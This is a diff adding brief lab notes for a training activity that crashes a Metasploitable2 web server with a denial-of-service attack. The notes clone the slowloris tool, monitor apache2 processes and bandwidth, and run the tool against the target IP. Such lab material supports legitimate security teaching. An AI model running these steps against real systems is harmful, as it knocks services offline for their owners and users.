@@ -1,0 +1,18 @@
+2.15.1 Activity - Crashing a Target with DoS
+
+git clone https://github.com/gkbrk/slowloris.git
+
+cd Desktop
+ls
+./netspeed2.sh eth0
+
+ps -A | grep apache2
+top -H -p  <first apache2 process ID>
+
+ls
+cd slowloris
+./slowloris.py <Metasploitable2 IP>
+
+Ctrl+c
+http
+Ctrl+c
